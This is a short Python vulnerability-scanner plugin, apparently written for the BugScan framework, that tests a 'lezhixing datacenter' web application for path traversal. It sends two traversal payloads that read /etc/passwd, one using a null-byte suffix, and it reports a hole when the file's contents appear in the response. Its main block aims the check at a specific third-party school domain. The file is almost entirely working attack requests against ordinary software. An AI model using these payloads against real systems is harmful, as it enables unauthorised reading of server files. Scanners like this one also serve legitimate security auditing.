#/usr/bin/env python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2010-0132070
#Refer http://www.wooyun.org/bugs/wooyun-2010-0121606
#__Author__ = 上善若水
#_PlugName_ = lezhixing_datacenter Plugin
#_FileName_ = lezhixing_datacenter.py



def assign(service, arg):
    if service == "lezhixing_datacenter":
        return True, arg    

def audit(arg):
    payloads = ('datacenter/global/login.do?bg=../../../../../../../etc/passwd%00','datacenter/ckfile.do?path=../../../../../../../../../../etc/passwd')
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode, _url = curl.curl2(url)
        if code == 200 and '/bin/bash' in res: 
            security_hole(url)            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('lezhixing_datacenter', 'http://www.dxyzzx.com/')[1])